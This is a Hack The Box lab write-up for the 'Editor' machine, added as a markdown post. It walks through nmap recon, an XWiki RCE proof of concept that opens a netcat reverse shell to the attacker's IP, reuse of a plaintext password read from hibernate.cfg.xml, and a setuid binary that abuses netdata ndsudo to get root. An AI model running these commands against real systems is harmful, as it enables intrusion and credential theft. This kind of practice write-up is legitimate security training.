@@ -1,0 +1,116 @@
+---
+title: "Editor"
+category: ["HTB", "Machines", "Editor"]
+---
+
+
+
+```shell
+[root@Hacking] /home/kali/Editor  
+❯ nmap editor.htb -A                                                                       
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Editor - SimplistCode Pro
+8080/tcp open  http    Jetty 10.0.20
+| http-title: XWiki - Main - Intro
+|_Requested resource was http://editor.htb:8080/xwiki/bin/view/Main/
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Jetty(10.0.20)
+| http-cookie-flags: 
+|   /: 
+|     JSESSIONID: 
+|_      httponly flag not set
+| http-methods: 
+|_  Potentially risky methods: PROPFIND LOCK UNLOCK
+| http-webdav-scan: 
+|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
+|   WebDAV type: Unknown
+|_  Server Type: Jetty(10.0.20)
+| http-robots.txt: 50 disallowed entries (15 shown)
+| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
+| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
+| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
+| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
+| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
+|_/xwiki/bin/undelete/
+```
+
+## CVE-2025-24893
+
+
+Enter port 8080 and find the version information at the bottom
+
+![](https://www.hyhforever.top/posts/2025/08/htb-editor/images/Pasted%20image%2020250809203926.png)
+
+Searched for this script
+
+- [gunzf0x/CVE-2025-24893: PoC for CVE-2025-24893: XWiki’ Remote Code Execution exploit for versions prior to 15.10.11, 16.4.1 and 16.5.0RC1.](https://github.com/gunzf0x/CVE-2025-24893)
+
+You can directly use the script to get the rebound shell
+
+```shell
+python CVE-2024-24893.py -t http://editor.htb:8080/ -c 'busybox nc 10.10.16.31 4444 -e /bin/bash'    
+```
+
+![](https://www.hyhforever.top/posts/2025/08/htb-editor/images/Pasted%20image%2020250809204259.png)
+
+Reference: [Configuration (XWiki.org)](https://www.xwiki.org/xwiki/bin/view/Documentation/AdminGuide/Configuration/)
+
+Found the password field in hibernate.cfg.xml
+
+```shell
+xwiki@editor:/usr/lib/xwiki/WEB-INF$ cat hibernate.cfg.xml  |grep password
+    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
+    <property name="hibernate.connection.password">xwiki</property>
+    <property name="hibernate.connection.password">xwiki</property>
+    <property name="hibernate.connection.password"></property>
+    <property name="hibernate.connection.password">xwiki</property>
+    <property name="hibernate.connection.password">xwiki</property>
+    <property name="hibernate.connection.password"></property>
+xwiki@editor:/usr/lib/xwiki/WEB-INF$ 
+```
+
+Among them, you can use theEd1t0rTeam99 password to log in to the oliver user
+
+![](https://www.hyhforever.top/posts/2025/08/htb-editor/images/Pasted%20image%2020250809215236.png)
+
+## Root
+
+
+Searching for files with special permissions, I found a suspicious ndsudo
+
+![](https://www.hyhforever.top/posts/2025/08/htb-editor/images/Pasted%20image%2020250809215329.png)
+
+After searching, I found this POC: [AzureADTrent/CVE-2024-32019-POC: POC for netdata ndsudo vulnerability - CVE-2024-32019](https://github.com/AzureADTrent/CVE-2024-32019-POC)
+
+Since there is no gcc on the target machine, local compilation is required.
+
+```shell
+[root@Hacking] /home/kali/Editor  
+❯ cat poc.c                                                
+#include <unistd.h>
+
+int main() {
+    setuid(0); setgid(0);
+    execl("/bin/bash", "bash", NULL);
+    return 0;
+}
+
+[root@Hacking] /home/kali/Editor  
+❯ gcc poc.c -o nvme
+
+[root@Hacking] /home/kali/Editor  
+❯ scp nvme oliver@editor.htb:/tmp/
+oliver@editor.htb's password: 
+nvme                                                                                                          100%   16KB  64.2KB/s   00:00    
+```
+
+Get root privileges
+
+![](https://www.hyhforever.top/posts/2025/08/htb-editor/images/Pasted%20image%2020250809215824.png)
